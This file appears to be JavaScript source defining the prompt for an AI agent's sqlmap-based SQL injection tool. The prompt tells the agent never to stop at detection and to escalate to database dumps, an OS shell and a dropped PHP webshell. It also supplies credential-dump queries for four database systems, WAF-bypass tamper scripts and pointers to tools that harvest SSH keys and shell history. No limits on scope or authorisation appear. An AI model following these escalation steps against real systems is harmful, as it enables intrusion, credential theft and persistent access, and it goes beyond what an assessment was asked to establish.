import { SQLI_TOOL_NAME } from './constants.js'

export const DESCRIPTION = `SQL injection testing with sqlmap. Detects vulnerabilities, dumps data, and attempts OS command execution.`

export const PROMPT = `## ${SQLI_TOOL_NAME} — SQL injection scanner, data extractor, and OS shell

Wraps sqlmap with --batch for non-interactive use. Returns structured findings.

### ESCALATION RULE — Never stop at detect_only:
1. action=detect_only → confirm vulnerability type (error, boolean, time, union)
2. action=dump_dbs → enumerate databases and find credentials/hashes
3. extra_args="--os-shell" → attempt interactive OS shell (MySQL stacked, MSSQL xp_cmdshell)
4. extra_args="--file-write /tmp/shell.php --file-dest /var/www/html/uploads/shell.php" → drop webshell
Goal: OS command execution or credential dump. Detection alone is not a complete finding.

### DB-specific credential dump techniques (use extra_args for targeted extraction):
- MySQL: extra_args="--technique=S --sql-query='SELECT user,password FROM mysql.user'"
- MSSQL: extra_args="--technique=S --sql-query='SELECT name,password_hash FROM sys.sql_logins'"
- PostgreSQL: extra_args="--sql-query='SELECT usename,passwd FROM pg_shadow'"
- Oracle: extra_args="--sql-query='SELECT USERNAME,PASSWORD FROM DBA_USERS'"

### Post-SQLi OS access — escalate with:
- PrivEscTool action=all — enumerate local priv-esc vectors
- CredHarvestTool — harvest SSH keys, .bash_history, application credentials
- ChainTool bug_class=sqli — for full escalation chain (INTO OUTFILE, xp_cmdshell, etc.)

### Input
- \`url\`: target URL (required). Use * to mark injection point: "http://target/page.php?id=1"
- \`method\`: GET or POST (default: GET)
- \`data\`: POST body string (for POST requests)
- \`cookie\`: session cookie string
- \`headers\`: additional HTTP headers as key=value pairs
- \`technique\`: BEUSTQ techniques to test (default: BEUSTQ = all)
- \`level\`: 1-5 thoroughness (default: 1)
- \`risk\`: 1-3 risk level (default: 1)
- \`dbms\`: hint database type (mysql, mssql, oracle, postgresql, sqlite)
- \`action\`: detect_only | dump_dbs | dump_tables | dump_data
- \`db\`: target database name (for dump_tables/dump_data)
- \`table\`: target table name (for dump_data)
- \`extra_args\`: raw sqlmap arguments (use for --os-shell, --file-write, --batch, etc.)

### WAF bypass via tamper scripts (when standard payloads are blocked):
- Cloudflare/Sucuri: extra_args="--tamper=space2comment,between"
- ModSecurity: extra_args="--tamper=charencode,randomcase"
- Generic: extra_args="--tamper=space2comment --level=3 --risk=2"

### Examples
- \`{ url: "http://target/page?id=1", action: "detect_only" }\`
- \`{ url: "http://target/page?id=1", action: "dump_dbs" }\`
- \`{ url: "http://target/login", method: "POST", data: "user=test&pass=test", action: "detect_only" }\`
- OS shell: \`{ url: "http://target/page?id=1", extra_args: "--os-shell --batch" }\`
- Drop webshell: \`{ url: "http://target/page?id=1", extra_args: "--file-write /tmp/shell.php --file-dest /var/www/html/shell.php --batch" }\`
- WAF bypass: \`{ url: "http://target/page?id=1", action: "detect_only", extra_args: "--tamper=space2comment,between" }\`
- High thorough: \`{ url: "http://target/page?id=1", level: "3", risk: "2", action: "detect_only" }\`
`
